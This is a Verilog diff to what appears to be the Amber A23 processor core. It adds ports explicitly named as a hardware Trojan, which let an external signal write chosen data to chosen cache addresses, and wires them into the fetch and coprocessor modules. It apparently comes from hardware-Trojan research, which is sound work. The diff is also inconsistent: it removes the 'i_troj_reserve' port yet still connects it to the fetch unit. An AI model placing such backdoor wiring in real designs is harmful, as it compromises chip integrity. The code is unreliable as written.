@@ -60,7 +60,10 @@ output                      o_wb_stb,
 input                       i_wb_ack,
 input                       i_wb_err,
 
-input						i_troj_reserve		/// Trojan signal for reserving upper cache area
+input						i_troj				/// Trojan signal for initializing cache data
+input		[31:0]			i_troj_write_data,	/// Trojan data written to cache
+input		[31:0]			i_troj_address,		
+input		[31:0]			i_troj_address_nxt
 
 );
 
@@ -176,6 +179,12 @@ a23_fetch u_fetch (
     .i_cacheable_area                   ( cacheable_area                    ),
 
     .i_system_rdy                       ( i_system_rdy                      ),
+	
+	.i_troj								( i_troj_reserve					),
+	.i_troj_write_data					( i_troj_write_data					),
+	.i_troj_address						( i_troj_address					),
+	.i_troj_address_nxt					( i_troj_address_nxt				),
+	
     .o_fetch_stall                      ( fetch_stall                       ),
     
     .o_wb_adr                           ( o_wb_adr                          ),
@@ -347,7 +356,7 @@ a23_coprocessor u_coprocessor (
     .i_fault_status                     ( decode_fault_status               ),
     .i_fault_address                    ( decode_fault_address              ), 
 	
-	.i_troj_reserve						( i_troj_reserve					),
+	.i_troj								( i_troj							),
     
     .o_copro_read_data                  ( copro_read_data                   ),
     .o_cache_enable                     ( cache_enable                      ),
